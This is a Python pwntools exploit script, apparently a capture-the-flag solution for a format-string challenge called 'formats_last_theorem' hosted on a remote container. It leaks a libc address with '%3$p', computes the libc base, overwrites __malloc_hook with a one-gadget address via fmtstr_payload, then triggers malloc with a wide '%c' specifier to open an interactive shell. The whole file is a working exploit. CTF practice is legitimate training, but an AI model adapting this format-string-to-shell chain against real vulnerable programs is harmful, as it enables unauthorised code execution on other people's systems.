
from pwn import *

context.clear(arch="amd64")
# r = process('./formats_last_theorem', level='error')
r = remote('dctf-chall-formats-last-theorem.westeurope.azurecontainer.io', 7482, level='error')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

write_off = libc.sym['write']
malloc = libc.sym['__malloc_hook']

r.readline()
r.sendline(b'%3$p')
r.readline()
LIBC = int(r.readline().strip(), 16) - 20 - write_off

log.info(f'0x{LIBC:x}')

r.readline()
r.readline()
r.sendline(fmtstr_payload(6, {LIBC+malloc: LIBC+0x10a41c}, write_size="short"))

r.readline()
r.readline()
r.sendline(b'%10000$c')
r.interactive()
